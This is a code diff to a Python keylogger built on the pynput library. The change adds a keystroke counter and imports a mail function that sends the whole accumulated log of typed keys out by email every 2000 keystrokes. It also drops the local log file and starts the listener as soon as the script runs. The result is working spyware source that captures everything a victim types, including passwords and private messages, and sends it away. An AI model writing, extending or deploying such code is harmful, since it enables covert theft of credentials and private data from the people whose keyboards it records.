@@ -1,7 +1,9 @@
 from pynput.keyboard import Listener
+from mailservice import send_mail
 
 
 logString = ""
+inputCounter = 0
 
 def key_formatter(inputString):
     """A simple function that polishes the input characters before they get added to the logfile"""
@@ -61,18 +63,19 @@ def key_formatter(inputString):
 def log_keystroke(key):
     """This is the logging function: every keyboard input is read and added to the logfile"""
     global logString
-
+    global inputCounter
+    
+    #After 2000 input keys, the logs will be sent through the mailing service script
+    if inputCounter >= 2000:
+        inputCounter = 0
+        send_mail(logString)
+    
     inputString = str(key).replace("'", "") #needs fixing: the " ' " character is ignored if written by the user
     inputString = key_formatter(inputString)
     logString = logString + inputString
-    #print(logString)
-    
-    #with open("src\log.txt", 'a', encoding='utf-8') as f:
-    #    f.write(inputString)
+    inputCounter = inputCounter + 1
 
-
-def start_listener():
-    # The "with" keyword will automatically close the listener.
-    # It always makes sure that the memory allocated to it will be released, no matter what.
-    with Listener(on_press=log_keystroke) as l:
-        l.join()
+# The "with" keyword will automatically close the listener.
+# It always makes sure that the memory allocated to it will be released, no matter what.
+with Listener(on_press=log_keystroke) as l:
+    l.join()
